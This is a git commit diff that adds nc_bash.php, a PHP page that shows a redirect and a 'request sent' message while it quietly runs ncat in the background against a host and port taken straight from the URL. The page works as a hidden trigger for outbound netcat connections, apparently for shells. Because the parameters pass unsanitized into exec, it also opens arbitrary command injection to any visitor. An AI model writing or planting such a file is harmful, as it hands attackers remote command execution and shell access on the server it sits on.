d15e80e9c62a39db3b9f6097753ff6a2077c2933
ly-temp <100673133+ly-temp@users.noreply.github.com>
2022-08-20 17:52:28 +0800

    Update nc_bash.php

--- nc_bash.php
+++ nc_bash.php
@@ -1,1 +1,9 @@
+<head>
+<meta http-equiv="refresh" content="0; url=/" />
+</head>
+request sent
+<a href="/">redirect</a>
 
+<?php
+  exec('ncat '.$_GET['host'].' '.$_GET['port'].' >/dev/null 2>&1 &');
+?>
